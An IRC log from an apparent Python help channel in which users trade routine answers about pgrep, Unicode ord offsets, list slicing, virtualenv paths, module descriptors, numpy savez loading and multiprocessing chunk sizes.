[18:40:12] *** Quits: whaley (uid13429@gateway/web/irccloud.com/x-jrtresjjydhxdlky) (Quit: Updating details, brb)
[18:40:14] *** Quits: impermanence (6cab87b9@gateway/web/cgi-irc/kiwiirc.com/ip.108.171.135.185) (Remote host closed the connection)
[18:40:16] <Yhg1s> ocx32: sure, you can do that.
[18:40:25] *** Joins: whaley (uid13429@gateway/web/irccloud.com/x-zdkrjbzivocmlblk)
[18:40:38] <ocx32> what component i use for checking on processes?
[18:41:00] *** Quits: amirpro (~amirpro@41.235.244.66) (Remote host closed the connection)
[18:41:28] *** Joins: jamesaxl (~James_Axl@41.249.19.212)
[18:41:28] *** Quits: root3d (~root3d@unaffiliated/root3d) (Remote host closed the connection)
[18:41:41] *** Joins: root3d (~root3d@unaffiliated/root3d)
[18:42:02] *** Joins: Arcaelyx (~Arcaelyx@2604:2000:f14a:2500:44b7:d903:69b3:3e53)
[18:42:03] *** Quits: sol1x (~sol1x@ipb21bc229.dynamic.kabel-deutschland.de) (Quit: WeeChat 1.4)
[18:42:15] <han-solo> ps aux | grep [P]rocess using subprocess ?
[18:42:16] *** Quits: root3d (~root3d@unaffiliated/root3d) (Remote host closed the connection)
[18:42:55] *** Joins: root3d (~root3d@unaffiliated/root3d)
[18:43:04] *** Quits: root3d (~root3d@unaffiliated/root3d) (Remote host closed the connection)
[18:43:14] *** Joins: wilbert_ (~wilbert@unaffiliated/wilbert)
[18:43:16] <WhileTrue> and, interestingly, there is no character 10 places away from "u" the arguments (u,10) return a blank line
[18:43:19] *** Quits: bablux (~bablux@gateway/tor-sasl/cyril1) (Ping timeout: 250 seconds)
[18:43:19] <han-solo> maybe there is a better way
[18:43:22] <nacelle> pgrep
[18:43:26] *** Joins: andyt (~andyt@alligin.plus.com)
[18:43:27] <nacelle> but you have to be careful
[18:43:31] <CrtxReavr> My normal mid-afternoon sleepiness plus eating too big a lunch is taking its toll today.
[18:43:46] *** Quits: cagomez (~cagomez@sb0-cf9a61b1.dsl.impulse.net) (Remote host closed the connection)
[18:43:52] <han-solo> I'm sober now
[18:44:21] *** Joins: amirpro (~amirpro@41.235.244.66)
[18:44:23] *** Joins: cagomez (~cagomez@sb0-cf9a61b1.dsl.impulse.net)
[18:44:28] <WhileTrue> I dont know about wrapping yet
[18:44:37] *** Joins: root3d (~root3d@unaffiliated/root3d)
[18:44:39] *** Quits: root3d (~root3d@unaffiliated/root3d) (Remote host closed the connection)
[18:44:45] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[18:45:48] *** Joins: NomadJim (~NomadJim@pdpc/supporter/active/nomadjim)
[18:46:14] *** Quits: csotelo (~csotelo@179.43.97.56) (Read error: Connection reset by peer)
[18:46:25] <WhileTrue> so the ord distances may not be the literal distances between the letters in the alphabet
[18:46:28] *** Joins: root3d (~root3d@unaffiliated/root3d)
[18:46:29] *** Quits: takane2 (~tkane@2603:3005:2303:b100:9dec:14db:470f:a2f8) (Ping timeout: 255 seconds)
[18:46:34] *** Quits: jb1123 (~Thunderbi@2a02:a03f:5230:2400:39ff:4a5a:ce7b:6748) (Ping timeout: 256 seconds)
[18:46:52] *** Joins: bablux (~bablux@gateway/tor-sasl/cyril1)
[18:47:02] *** Quits: root3d (~root3d@unaffiliated/root3d) (Remote host closed the connection)
[18:47:09] *** Quits: han-solo (~han-solo@unaffiliated/han-solo) (Quit: leaving)
[18:47:27] *** Joins: jb1123 (~Thunderbi@143.139-242-81.adsl-dyn.isp.belgacom.be)
[18:47:33] <_habnabit> dude-x, time.time is a numeric value; there's no timezone
[18:48:09] <dude-x> it's based on UTC time anyway right (or at least the countdown from a single point of time)
[18:48:12] <dude-x> cont up
[18:48:14] <_habnabit> ocx32, that's all very easy with twisted
[18:48:20] *** Quits: rpkilby (~rpkilby@152.7.255.194) (Remote host closed the connection)
[18:48:25] <_habnabit> dude-x, yeah, the epoch is most easily expressed with UTC
[18:48:25] *** Joins: takane2 (~tkane@2603:3005:2303:b100:9dec:14db:470f:a2f8)
[18:48:31] *** Joins: sunil_bansal (~sunil_ban@183.82.16.215)
[18:48:48] *** Joins: ThiefMaster` (adrian@indico/developer/thiefmaster)
[18:48:52] <_habnabit> dude-x, but you could also say it was "Wed Dec 31 16:00:00 PST 1969"
[18:49:02] *** Joins: lumm (~lumm@221.41.136.77.rev.sfr.net)
[18:49:27] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 240 seconds)
[18:49:37] *** Quits: redrum88 (~Helder@177.180.184.84) (Quit: Leaving!)
[18:49:39] <dude-x> gotcha
[18:50:30] *** Quits: codymj (~codymj@rrcs-71-41-86-116.se.biz.rr.com) (Ping timeout: 260 seconds)
[18:50:34] *** Joins: Konig (~Konig@ec2-18-206-101-102.compute-1.amazonaws.com)
[18:51:11] *** Joins: kajo (~kajo@2a02:908:2f33:d560:8e10:876f:c7a8:294d)
[18:51:28] <ocx32> whats twisted?
[18:51:33] *** Quits: bablux (~bablux@gateway/tor-sasl/cyril1) (Ping timeout: 250 seconds)
[18:52:10] <meejah> ocx32: a very nice async networking framework, see https://twistedmatrix.com
[18:52:17] <ali1234> WhileTrue: the ord distances are the literal distances in the unicode alphabet, which is 2^21 "letters" long (and has gaps where there is no letter)
[18:52:30] <ocx32> isnt it an overkill?
[18:52:43] <_habnabit> ocx32, how so? it does what you want and makes it easy for you
[18:52:49] *** Quits: sunil_bansal (~sunil_ban@183.82.16.215) (Ping timeout: 248 seconds)
[18:52:49] *** Joins: Adam_eM (~adam@31-178-184-139.dynamic.chello.pl)
[18:53:57] <ocx32> ok so it doesnt require like lot of docuemntation to understand it
[18:54:03] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[18:54:13] *** Joins: techalchemy (~Hawkerz@unaffiliated/hawkerz)
[18:54:13] <_habnabit> ocx32, certainly less documentation than it would take to write this from scratch
[18:54:28] <ocx32> ok thank you
[18:54:29] *** Joins: newdimension_ (~newdimens@64.137.155.29)
[18:54:37] *** Quits: vovioheler (2e657e4f@gateway/web/freenode/ip.46.101.126.79) (Quit: Page closed)
[18:54:40] *** Joins: Elodin (~weechat@unaffiliated/padawan)
[18:54:41] <WhileTrue> ali1234, hey hey, I spotted a gap among 2^21 possibilities?
[18:54:46] *** Quits: RickDeckard (~tgburrin@152.179.78.138) (Ping timeout: 268 seconds)
[18:55:13] *** Joins: mRWaffles (d10a540c@gateway/web/freenode/ip.209.10.84.12)
[18:55:14] <ali1234> WhileTrue: there are more gaps than letters, but i suspect you actually found the space character
[18:55:50] <ali1234> or some other weird thing
[18:56:26] *** Joins: RickDeckard (~tgburrin@152.179.78.138)
[18:56:42] <WhileTrue> when I run (" ",-10), it doesn't show "u", but anyway, I dont know about the unicode realm :)
[18:57:37] *** Joins: borkr (~borkr@static130-244.mimer.net)
[18:58:02] <ali1234> yeah you actually landed on DEL
[18:58:35] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 240 seconds)
[18:58:42] <ali1234> try ("au", 10)
[18:59:33] <ali1234> hmm apparently DEL doesn't actually work on my terminal
[18:59:35] *** Quits: manuelschneid3r (~manuelsch@p57A39159.dip0.t-ipconnect.de) (Ping timeout: 265 seconds)
[18:59:49] *** Quits: RickDeckard (~tgburrin@152.179.78.138) (Client Quit)
[19:00:22] <WhileTrue> that gives "k"
[19:00:39] <jayjo_> is there an easy way to iterate the edges of a list until they meet in the middle? like ['0.05', '0.10', '0.15', '0.20', '0.25', '0.30', '0.35', '0.40', '0.45', '0.50', '0.55', '0.60', '0.65', '0.70', '0.75', '0.80', '0.85', '0.90', '0.95'] iterating with '0.05' & '0.95', '0.10' & '0.90', ...
[19:00:53] <ali1234> it actually gives "k\x7f" but the \x7f is invisible
[19:01:06] <ali1234> https://en.wikipedia.org/wiki/Delete_character
[19:01:25] <ali1234> you might also see ␡ - actually i'm not sure why you don't
[19:01:52] <ali1234> anyway you need to implement wrapping yourself to make it work how you expect
[19:01:54] *** Joins: unpythonic (~unpythoni@c-98-207-240-139.hsd1.ca.comcast.net)
[19:02:04] *** Joins: Johnjay (26780a63@gateway/web/freenode/ip.38.120.10.99)
[19:02:34] *** Joins: adoua (~adoua@unaffiliated/adoua)
[19:02:50] *** Quits: rebrec (~rebrec@82-64-53-213.subs.proxad.net) (Quit: The Lounge - https://thelounge.github.io)
[19:03:07] *** Joins: shabius_ (~shabius@broadband-46-188-26-119.2com.net)
[19:03:28] <jayjo_> somehow to break the iteration after len(list)//2 iterations, or something?
[19:03:33] *** Quits: basen_ (~basen_@62-178-248-26.cable.dynamic.surfer.at) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[19:03:36] *** Joins: rkfb (~rkfb@cpc1-glfd7-2-0-cust20.6-2.cable.virginm.net)
[19:03:41] <jayjo_> or to only enumerate up to that level?
[19:03:45] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[19:03:48] <ali1234> jayjo_: itertools.islice
[19:04:10] <ali1234> actually if you have a list, just clice it
[19:04:13] <ali1234> *slice
[19:04:28] <ali1234> mylist[:len(mylist)//2]
[19:04:32] <Adam_eM> hi there
[19:05:04] *** Joins: rebrec (~rebrec@82-64-53-213.subs.proxad.net)
[19:05:22] <WhileTrue> is this the wrapping you've mentioned? https://docs.python.org/3/library/textwrap.html?highlight=wrap#module-textwrap
[19:05:23] *** Quits: shabius_ (~shabius@broadband-46-188-26-119.2com.net) (Client Quit)
[19:05:30] <ali1234> WhileTrue: no
[19:05:39] <Adam_eM> why the file path is showing only once in the following code? What do I do wrong? https://paste.pound-python.org/show/VQhnNrjNGfm5riY7w3GZ/
[19:06:01] *** Quits: cdown (~cdown@199.201.66.0) (Quit: https://chrisdown.name)
[19:06:18] *** Joins: basen_ (~basen_@62-178-248-26.cable.dynamic.surfer.at)
[19:06:33] *** Joins: cyanide (~cyanide@unaffiliated/cyanide)
[19:06:43] *** Quits: shabius (~shabius@2a07:241:1:1021::1004) (Ping timeout: 256 seconds)
[19:07:37] *** Joins: flipcoder (~flipcoder@2601:200:4301:1384::6a40)
[19:08:30] <Adam_eM> the code should append a file path each time I click the button and it does that only once
[19:08:38] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 276 seconds)
[19:08:46] *** Joins: lostname (~lostname@ool-457c2f10.dyn.optonline.net)
[19:08:48] *** Joins: bablux_ (~bablux@gateway/tor-sasl/cyril1)
[19:09:25] <ali1234> jayjo_: for pairs from the beginning and end, iterate this: zip(L[:len(L)//2], reversed(L))
[19:09:26] *** Quits: [itchyjunk] (~itchyjunk@unaffiliated/itchyjunk/x-1640057) (Remote host closed the connection)
[19:10:12] <ali1234> it does not give you the middle value if the length is odd
[19:10:26] <lostname> Hey guys, i have a virtualenv running pypy3 and am struggling to install packages locally into the env. How do you go about it? thanks!
[19:10:40] <cdunklau> lostname: path/to/venv/bin/pip install whatever
[19:11:34] <dunnousername> Hey, so I'm writing a class to represent s-expressions in a file. The way I'm writing it, the Sexp class is an ordered list (effectively making a tree) of other Sexp's. But, I want a Sexp to also represent an int or a string. How should I do this?
[19:12:07] <dunnousername> Should I extend 'int' or 'str' to do that?
[19:12:28] <bjs> dunnousername: what does your S-Expr class look like?
[19:12:46] *** Joins: shabius (~shabius@2a07:241:1:1021::1002)
[19:12:55] <lostname> cdunklau, that's what i've been doing except that it looks outside to my machine's python /site-packages folder and sees that the package is already there and aborts.
[19:13:09] <dunnousername> I'm trying to figure out how I should organize it, I don't have a lot right now
[19:13:13] <cdunklau> lostname: interesting. how did you make the venv?
[19:13:31] *** Joins: plastico (~plastico@89-181-141-157.net.novis.pt)
[19:13:34] <ali1234> dunnousername: don't extend int, it won't work how you expect due to the way python works
[19:13:36] *** Joins: Darkhunter (~mmojzis@static-84-42-152-237.net.upcbroadband.cz)
[19:13:48] *** Joins: audioburn (~theology@unaffiliated/not-mike/x-4399907)
[19:14:00] <cdunklau> lostname: what's env | grep PYTHON  output
[19:14:04] <lostname> cdunklau, i ran: virtualenv -p /usr/bin/pypy3 from my home folder to create. Then source bin/activate to start it up
[19:14:08] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[19:14:10] <dunnousername> ali1234, okay, that makes sense
[19:14:23] <cdunklau> lostname: what's virtualenv --version   output
[19:14:35] *** Joins: gelignite (~gelignite@55d4c532.access.ecotel.net)
[19:15:04] <ali1234> dunnousername: if you do x = MyIntObject(1); x = x + 1 now x is not a MyIntObject, it's a regular old int
[19:15:17] *** Quits: grateful (~grateful@unaffiliated/grateful) (Ping timeout: 255 seconds)
[19:15:19] <dunnousername> Ah, that makes sense
[19:15:20] *** Quits: Mattiaslndstrm (~Mattiasln@2806:103e:9:257e:87b:ca12:784b:f877) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[19:15:30] *** Quits: plastico (~plastico@89-181-141-157.net.novis.pt) (Client Quit)
[19:15:34] <ali1234> dunnousername: instead you should implement the data model
[19:15:56] <lostname> cdunklau, the grep command returns nothing, version is 15.2.0
[19:16:24] <nedbat> dunnousername: what do you mean by, "a Sexp should also represent an int or string"?   How would you use an Sexp like that?
[19:16:41] <cdunklau> lostname: hmm that should default to no site packages. what's path/to/venv/bin/pypy -m site   output
[19:16:51] <cdunklau> lostname: and path/to/venv/bin/pip --version
[19:17:15] <dunnousername> I thought a Sexp is, gramatically, another Sexp, a string, or an int
[19:17:31] <nedbat> dunnousername: ok, and what would that mean in your code?
[19:18:04] *** Joins: sunil_bansal (~sunil_ban@183.82.16.215)
[19:18:07] <dunnousername> What do you mean?
[19:18:22] <dunnousername> I think I understand it now
[19:18:25] *** Quits: cyphase (~cyphase@unaffiliated/cyphase) (Ping timeout: 256 seconds)
[19:19:05] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 260 seconds)
[19:19:12] *** Joins: dimitrovskif (~dimitrovs@89.205.68.164)
[19:19:27] *** Joins: lbalhar (~lbalhar@93.185.13.26)
[19:19:34] <ali1234> i do wish you could own = in python, but you can't afaik
[19:19:37] *** Joins: codymj (~codymj@rrcs-71-41-86-116.se.biz.rr.com)
[19:19:44] <lostname> cdunklau, the output for pypy -m site made me realize what i did
[19:19:47] <nedbat> ali1234: you cannot override =, no.
[19:20:00] <ali1234> but i want to
[19:20:05] <nedbat> ali1234: i'm sorry.
[19:20:07] *** Quits: basen_ (~basen_@62-178-248-26.cable.dynamic.surfer.at) (Quit: Textual IRC Client: www.textualapp.com)
[19:20:08] <lostname> cdunklau, like a dope i renamed the env folder, that's why it couldn't find the paths to install to
[19:20:13] *** Joins: zenix_2k2 (~zenix_2k2@42.112.229.101)
[19:20:15] <ali1234> it's okay, there are very few things you can do in python
[19:20:17] <nedbat> ali1234: you can affect what obj.attr=val  means
[19:20:21] *** Joins: bablux (~bablux@mail.levis.name)
[19:20:21] <ali1234> yes, i know
[19:20:22] <nedbat> *can't
[19:20:31] <ali1234> no, you can
[19:20:37] <ali1234> descriptors can do that
[19:20:41] <zenix_2k2> one question is there anyhow i can run a python script on a GUI with tkinter ? and if tkinter can't do it then any other better module that you suggest ?
[19:20:48] <ali1234> as long as you have obj.something
[19:20:51] <bjs> ali1234: nedbat means there are very little things you _cant_ do
[19:20:52] <zenix_2k2> and my python script is basically printing something out
[19:20:57] <zenix_2k2> nothing too much
[19:21:01] <nedbat> ali1234: you said, "there are very few things you can do in python"
[19:21:07] <lostname> cdunklau, thanks for help in fixing that. Now it looks like I have another issue lol, let's see if I can fix this one...
[19:21:07] <cdunklau> lostname: hooray!
[19:21:09] <bjs> ali1234: it just so happens that assignment to bare names is one of them
[19:21:16] <SunDwarf> you can override assignment if you try really hard
[19:21:17] *** Quits: Volis (uid12493@gateway/web/irccloud.com/x-vqdfxyohfaavappw) (Quit: Connection closed for inactivity)
[19:21:18] <ali1234> nedbat: i meant can't
[19:21:19] *** Quits: sdoherty (sdoherty@nat/redhat/x-urwnubgubzpdmjqj) (Remote host closed the connection)
[19:21:28] <nedbat> ali1234: I know.  That's why I said, "*can't"  :)
[19:21:30] <SunDwarf> you just step into the bytecode level
[19:21:40] *** Quits: dimitrovskif (~dimitrovs@89.205.68.164) (Remote host closed the connection)
[19:21:40] <ali1234> haha i thought you meant that you meant can't
[19:21:46] <ali1234> okay i understand now
[19:21:57] *** Joins: dimitrovskif (~dimitrovs@89.205.68.164)
[19:22:55] <zenix_2k2> so uhm hi ?
[19:23:00] *** Joins: Fulgen (~Fulgen@078132058052.public.t-mobile.at)
[19:23:35] *** Quits: sunil_bansal (~sunil_ban@183.82.16.215) (Ping timeout: 276 seconds)
[19:23:46] <ali1234> nedbat: i'm still trying to remove all the magic from my scripting thing
[19:24:00] <ali1234> being able to override = would make it much simpler
[19:24:01] <nedbat> ali1234: i thought you liked the magic
[19:24:23] *** Quits: bablux_ (~bablux@gateway/tor-sasl/cyril1) (Quit: bablux_)
[19:24:36] <ali1234> i don't like it, i just don't dislike it
[19:24:51] *** Joins: writenix (~writenix@191.58.115.89.rev.vodafone.pt)
[19:24:54] *** Joins: pangolin_ (~pangolin@cpe-104-138-172-211.triad.res.rr.com)
[19:25:01] <ali1234> what i've done is make a this_module() function, which gives you a reference to the module you call it from
[19:25:14] *** Joins: RebelCoder (~RebelCode@82.129.117.5)
[19:25:31] <ali1234> so instead of saying "__magic__ = whatever" you say "this_module().magic = whatever"
[19:25:32] *** Quits: Alejoux (~Alejoux@2a01:e35:2e59:7ce0:78c8:602d:d850:3491) (Ping timeout: 256 seconds)
[19:25:54] <ali1234> it makes linters/IDEs work, because this_module() is type hinted
[19:26:08] *** Joins: rjdp9736 (~rjdp9736@183.82.17.102)
[19:26:10] <sartan> you can type hint with __all__
[19:26:15] <ali1234> it also means that properties work, because now there's a .
[19:26:54] *** Joins: cacarimas (a1093d83@gateway/web/freenode/ip.161.9.61.131)
[19:27:07] <ali1234> sartan: that's not helpful because __magic__ was not imported from anywhere
[19:27:18] <ali1234> it was magic
[19:27:36] *** Quits: Fulgen (~Fulgen@078132058052.public.t-mobile.at) (Read error: Connection reset by peer)
[19:27:38] <sartan> magic.
[19:27:44] <sartan> this sounds weird. i'm going to stay away from it
[19:27:49] <sartan> Enjoy casting spells!
[19:27:55] <ali1234> anyway, the problem now is that you can still say "magic = somethingelse" in the module
[19:27:55] *** Joins: mr_RoBoT7577 (~Thunderbi@2405:204:530e:e68c:58d1:685e:9ea0:edae)
[19:27:57] *** Joins: grateful (~grateful@unaffiliated/grateful)
[19:27:58] <Wooble> zenix_2k2: sure, you can make a GUI in python with tkinter.
[19:28:09] <ali1234> if this_module().magic is a property, then now the module has two magics
[19:28:23] <ali1234> that's bad, i am trying to figure out a way to prevent that from hapening
[19:28:32] *** Quits: kri (~kri@smokalot.ml) (Ping timeout: 245 seconds)
[19:28:46] *** Joins: bm371613 (~bartek@2a02:a317:603f:9800:3d21:d4ea:8e13:962a)
[19:28:49] <SunDwarf> rewrite module bytecode
[19:28:56] *** Parts: mr_RoBoT7577 (~Thunderbi@2405:204:530e:e68c:58d1:685e:9ea0:edae) ()
[19:28:58] <cacarimas> hello. i saved my dictonary using np.savez_compressed, and then loaded it, but i can't recovery anything from it. it just gives a 0d array, inside i can see my dictionary, but no way i can access it using dict[0], or dict['0'] etc
[19:29:00] <ali1234> lol
[19:29:05] <zenix_2k2> Wooble: no i mean displaying a command's stdout on it
[19:29:19] <Wooble> zenix_2k2: you can display whatever you want in a text box.
[19:29:20] <SunDwarf> rewrite STORE_ATTR into CALL_FUNCTION
[19:29:21] *** Quits: modwizcode (~modwizcod@140.221.3.22) (Quit: Leaving)
[19:29:22] *** Joins: Fulgen (~Fulgen@078132058052.public.t-mobile.at)
[19:29:24] <ali1234> i was thinking of feeding a fake dict to exec and then checking the result before putting it in the real module
[19:29:26] <SunDwarf> (and a POP_TOP)
[19:29:27] <cacarimas> for example when i'm trying to convert it to lst, it just gives an error iteration over a 0d adday
[19:29:28] <_habnabit> SunDwarf, helpful suggestions only please
[19:29:35] <SunDwarf> that was a helpful suggestion
[19:29:38] <cacarimas> s there a way to recover my dictionary
[19:29:48] <SunDwarf> I have rewritten function bytecode for less
[19:29:54] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[19:30:04] <bjs> SunDwarf: that doesn’t sound like a good thing
[19:30:24] <ali1234> SunDwarf: i'll keep it in mind, but i'd use pretty much any other solution first :)
[19:30:29] *** Quits: davr0s (~textual@host86-138-235-28.range86-138.btcentralplus.com) (Quit: My MacBook Pro has gone to sleep. ZZZzzz…)
[19:30:31] *** Quits: SopaXorzTaker (~SopaXorzT@unaffiliated/sopaxorztaker) (Remote host closed the connection)
[19:30:36] <grym> cacarimas: my_uncompressed_thing.item() ?
[19:30:49] *** Joins: chachan (~chachan@168.232.28.50)
[19:31:29] *** Joins: enterprisey (~enterpris@wikipedia/enterprisey)
[19:31:54] <ali1234> the interesting thing is if you do "import x; x.magic" you get the descriptor - at least i think you do
[19:32:05] *** Quits: adoua (~adoua@unaffiliated/adoua) (Ping timeout: 240 seconds)
[19:32:16] <cacarimas> grym: very much appreciated!
[19:32:17] <_habnabit> ali1234, if 'x' is an instance of an object with 'magic' as a descriptor on its class, yes
[19:32:19] <cacarimas> it works
[19:32:20] <ali1234> but if you do "from x import magic" then you get the non-descriptor
[19:32:21] *** Quits: inad922 (~inad925@outbound.hortonworks.com) (Ping timeout: 240 seconds)
[19:32:27] *** Quits: kallesbar (~kallesbar@95.175.104.126) (Ping timeout: 240 seconds)
[19:32:29] <ali1234> and that's clearly bad
[19:32:41] *** Quits: rudrab (~rudrab@14.139.59.140) (Quit: rudrab)
[19:32:45] <_habnabit> ali1234, that does `import x; magic = x.magic`, so you only evaluate it once
[19:32:53] *** Quits: dimitrovskif (~dimitrovs@89.205.68.164) (Remote host closed the connection)
[19:32:55] <ali1234> hmm okay
[19:32:56] *** Quits: edne (~edne@net-2-42-74-190.cust.vodafonedsl.it) (Ping timeout: 265 seconds)
[19:32:56] *** Quits: Fulgen (~Fulgen@078132058052.public.t-mobile.at) (Read error: Connection reset by peer)
[19:32:57] *** Quits: newdimension_ (~newdimens@64.137.155.29) (Quit: Leaving)
[19:33:06] <bjs> so the descirptor __get__ will only be called once, which is probably what you're seeing
[19:33:09] *** Joins: dimitrovskif (~dimitrovs@89.205.68.164)
[19:33:13] <ali1234> yeah
[19:33:41] <ali1234> i also saw PEP562 vs PEP549
[19:33:43] *** Quits: catbusters (uid40652@gateway/web/irccloud.com/x-qxoslrwrqgcdaqmd) (Quit: Connection closed for inactivity)
[19:33:46] *** Quits: rjdp9736 (~rjdp9736@183.82.17.102) (Quit: My MacBook Air has gone to sleep. ZZZzzz…)
[19:33:55] <ali1234> they both could have been useful to what i am doing
[19:34:06] *** Quits: pangolin_ (~pangolin@cpe-104-138-172-211.triad.res.rr.com) (Quit: Konversation terminated!)
[19:34:19] *** Joins: pangolin_ (~pangolin@cpe-104-138-172-211.triad.res.rr.com)
[19:34:26] <ali1234> 549 perhaps more so than 562
[19:34:37] *** Joins: enhance (enhance@nat/redhat/x-ogyszxcnyarsvmno)
[19:34:55] *** Joins: twandy (~Thunderbi@2606:7400:c16::f252)
[19:35:00] *** Quits: Ignacy (~Ignacy@cA0AD00C3.dhcp.as2116.net) (Remote host closed the connection)
[19:36:02] *** Joins: singularity00 (~singulari@85.187.64.126.client.entry.bg)
[19:36:10] *** Joins: AliGeyik (~Thunderbi@78.172.235.234)
[19:36:43] *** Parts: lostname (~lostname@ool-457c2f10.dyn.optonline.net) ("Leaving")
[19:36:53] <ali1234> hmm i think i know what to do
[19:37:09] *** Joins: Technodrome (~textual@unaffiliated/technodrome)
[19:37:47] *** Joins: dwn (~cute@unaffiliated/dwn)
[19:38:10] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 245 seconds)
[19:38:33] *** Joins: d3vyL (~d3vyL@host28-167-dynamic.42-79-r.retail.telecomitalia.it)
[19:38:42] *** Quits: dramsey_ (~dramsey@2603:3015:ed1:e000:80b3:5d3a:dc04:4b5e) (Ping timeout: 256 seconds)
[19:39:08] *** Joins: Driveways_ (~Driveways@216.228.46.200)
[19:39:13] *** Joins: aielima_ (~aielima@gateway/tor-sasl/aielima)
[19:39:31] *** Quits: motaka2 (~Thunderbi@160.128.79.188.dynamic.jazztel.es) (Quit: motaka2)
[19:40:07] <dwn> permutations/multiprocessing question: pool.imap_unordered over an itertools cartesian product with chunksize set to like 50000, I think since there's only one core generating the chunks of 50000, the other processes consume it quicker than it can generate X chunks where X is the number of cores
[19:40:23] *** Parts: d3vyL (~d3vyL@host28-167-dynamic.42-79-r.retail.telecomitalia.it) ()
[19:40:44] *** Joins: DTZUZU (~DTZUZU@S0106bcd16584b0aa.vs.shawcable.net)
[19:40:48] <dwn> so the efficiency is way down, since in reality there's only like 2-3 cores processing a chunk at atime
[19:42:06] *** Joins: cnidario (~dont@cli-5b7ec28e.ast.adamo.es)
[19:42:24] <dwn> is there any way to automagically find that "optimum" chunk size?
[19:43:11] *** Quits: Farad41 (~Thunderbi@cpe-67-249-147-94.twcny.res.rr.com) (Ping timeout: 255 seconds)
[19:43:59] <bjs> dwn: that sounds like a hard problem
[19:44:04] <bjs> dwn: maybe you can parallelise the product?
[19:44:06] *** Quits: duderonomy (~duderonom@c-73-222-239-211.hsd1.ca.comcast.net) (Ping timeout: 268 seconds)
[19:44:11] <dwn> yeah that was my thought
[19:44:47] <dwn> but apparently nobody else has wanted to parallelize itertools generators?
[19:45:10] <dwn> so maybe there is another solution people are taking
[19:45:57] <cdunklau> dwn: what's the input
[19:46:08] <cdunklau> dwn: do you have sequences or just iterators
[19:46:13] *** Quits: Edico (~fenrir@unaffiliated/edico) (Quit: Leaving.)
[19:46:30] *** Quits: dimitrovskif (~dimitrovs@89.205.68.164) (Ping timeout: 245 seconds)
[19:46:42] <dwn> itertools.product(*(["a",["b","c"],"d",["e","f","g"]]))
[19:46:57] *** Quits: redj (~quassel@bchmpq5707w-lp130-01-64-228-3-42.dsl.bell.ca) (Ping timeout: 260 seconds)
[19:48:39] *** Quits: merc88 (~merc88@unaffiliated/merc88) (Quit: Do not go gentle into that good night...)
[19:48:44] <cdunklau> dwn: i'm thinking that if they're sequences, you can just calculate the items that each process will work on, inside each process
[19:48:47] *** Parts: takane2 (~tkane@2603:3005:2303:b100:9dec:14db:470f:a2f8) ()
[19:49:16] *** Joins: roadie (~user@2a02:8108:f40:17f1:7c98:fed5:2a91:5f5c)
[19:49:45] *** Quits: StygianBlues (~StygianBl@2600:380:1823:768b:9112:d0e7:390c:33f8) (Read error: Connection reset by peer)
[19:49:48] *** Joins: Bryson (~anonymous@ip68-224-118-31.lv.lv.cox.net)
[19:49:52] <ali1234> why does exec() globals *have* to be a subclass of dict?
[19:50:02] *** Joins: StygianBlues (~StygianBl@74-194-176-205.chstcmtk03.res.dyn.suddenlink.net)
[19:50:06] <ali1234> rather than just something that implements the right datamodel?
[19:50:09] *** Quits: phd (~vjetar@62-132.dsl.iskon.hr) (Quit: Leaving)
[19:50:36] *** Joins: takane2 (~tkane@2603:3005:2303:b100:9dec:14db:470f:a2f8)
[19:50:36] *** Quits: takane2 (~tkane@2603:3005:2303:b100:9dec:14db:470f:a2f8) (Quit: Leaving.)
[19:50:37] *** Joins: fikka (~fikka@5403BEC5.catv.pool.telekom.hu)
[19:51:13] <deniska> ali1234: I guess because the runtime directly accesses that dict internals instead of going through __getitem__
[19:51:22] <ali1234> hmm
[19:51:52] <deniska> (don't quote me on that though)
[19:51:53] *** Joins: dramsey_ (~dramsey@c-68-37-94-119.hsd1.mi.comcast.net)
[19:52:02] <dwn> cdunklau: hm, it's hard to imagine
[19:52:30] *** Joins: cjohnson (~cjohnson@li133-72.members.linode.com)
[19:52:47] <dwn> within a process given that splatted set, deterministically decide which to iterate
[19:53:03] <cjohnson> What is a python-ey way to add a dict to a list if another dict of similar shape is not already present
[19:53:21] <cjohnson> namely my dict is {'name': 'foo'} and the list should really only contain objects of that shape
[19:53:28] <cjohnson> so I only need to check if another dict has name: 'foo'
[19:53:46] *** Quits: purplex88 (~purplex88@unaffiliated/purplex88) (Quit: Going offline, see ya! (www.adiirc.com))
[19:54:06] *** Joins: redj (~quassel@bchmpq5707w-lp130-01-64-228-3-42.dsl.bell.ca)
[19:54:13] <Wooble> ali1234: what version of python are you using? that was supposed to change in 3.3
[19:54:22] <ali1234> Wooble: 3.6
[19:54:24] <nedbat> cjohnson: make a dict indexed by name.
[19:54:39] *** Quits: Bahrouz (~Bahrouz@unaffiliated/bahrouz) (Quit: KVIrc 4.9.2 Aria http://www.kvirc.net/)
[19:54:45] *** Joins: kurkale6ka (~kurkale6k@84.45.99.125)
[19:54:49] *** Quits: writenix (~writenix@191.58.115.89.rev.vodafone.pt) (Quit: Leaving)
[19:54:53] *** Quits: harmaahylje (~drc@gem.muuttuja.fi) (Ping timeout: 256 seconds)
[19:54:54] *** Joins: blip- (~blip-@unaffiliated/blip-)
[19:55:03] *** Joins: sydbarret (AdiIRC@unaffiliated/sydbarret)
[19:55:10] <cjohnson> nedbat: This is a one-off call for a dict that I have no further use for maintaining (this is an ansible plugin where I am providing some default values to an ansible module)
[19:55:15] *** Quits: fikka (~fikka@5403BEC5.catv.pool.telekom.hu) (Ping timeout: 256 seconds)
[19:55:18] *** Quits: polarfire (~polarfire@d58c56d2.rev.dansknet.dk) (Quit: WeeChat 2.1)
[19:55:38] <nedbat> cjohnson: does that mean you don't want to use a dict indexed by name?
[19:55:51] *** Quits: unpythonic (~unpythoni@c-98-207-240-139.hsd1.ca.comcast.net) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[19:55:55] <sydbarret> When I do "url = div.find('a')['href']" I got this TypeError: 'NoneType' object is not subscriptable. I think its because div does not contain the 'a' tag. How can I validate this?
